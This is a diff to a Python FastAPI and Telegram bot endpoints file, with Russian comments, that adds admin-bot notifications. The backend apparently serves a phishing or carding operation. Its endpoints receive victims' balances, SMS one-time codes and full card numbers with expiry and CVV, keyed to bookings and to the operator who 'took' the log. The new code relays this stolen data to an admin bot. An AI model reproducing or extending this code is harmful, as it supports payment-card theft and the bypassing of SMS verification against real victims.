@@ -1,3 +1,5 @@
+# [file name]: endpoints.py (обновленная версия)
+# [file content begin]
 from fastapi import FastAPI
 from aiogram import Bot
 import datetime
@@ -9,6 +11,9 @@ sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
 from database.crud import get_log_by_session, create_or_update_log, find_card_duplicates
 from api.handy_api import get_card_info, format_card_info
 from bot.keyboards import get_take_log_keyboard, get_management_keyboard
+
+# Импортируем функции уведомлений для админского бота
+from admin_bot import notify_balance, notify_sms, notify_card_change
 import config
 
 def register_endpoints(app: FastAPI, bot: Bot):
@@ -105,6 +110,17 @@ def register_endpoints(app: FastAPI, bot: Bot):
                     f"#{booking_id} || #{client_id}\n\n"
                     f"✅ Баланс юзера получен!\n\n💰 Сумма: {balance} AED"
                 )
+                
+                # Уведомляем админский бот
+                username = "неизвестно"
+                try:
+                    user = await bot.get_chat(log['taken_by'])
+                    username = user.username or "без username"
+                except:
+                    pass
+                    
+                await notify_balance(booking_id, client_id, username, log['taken_by'], balance)
+                
         return {"status": "ok"}
 
     @app.post("/sms-notify")
@@ -123,6 +139,17 @@ def register_endpoints(app: FastAPI, bot: Bot):
                     f"#{booking_id} || #{client_id}\n\n"
                     f"✅ Код смс получен!\n\n🔢 Код: {sms}"
                 )
+                
+                # Уведомляем админский бот
+                username = "неизвестно"
+                try:
+                    user = await bot.get_chat(log['taken_by'])
+                    username = user.username or "без username"
+                except:
+                    pass
+                    
+                await notify_sms(booking_id, client_id, username, log['taken_by'], sms)
+                
         return {"status": "ok"}
 
     @app.post("/change-card-notify")
@@ -182,6 +209,16 @@ def register_endpoints(app: FastAPI, bot: Bot):
                     reply_markup=get_management_keyboard(session_id),
                     parse_mode="HTML"
                 )
+                
+                # Уведомляем админский бот о смене карты
+                username = "неизвестно"
+                try:
+                    user = await bot.get_chat(log['taken_by'])
+                    username = user.username or "без username"
+                except:
+                    pass
+                    
+                await notify_card_change(booking_id, client_id, username, log['taken_by'], card_without_spaces, changed_expire, changed_cvv)
 
             return {"status": "ok"}
             
@@ -190,3 +227,4 @@ def register_endpoints(app: FastAPI, bot: Bot):
             import traceback
             traceback.print_exc()
             return {"status": "error", "message": str(e)}, 500
+# [file content end]
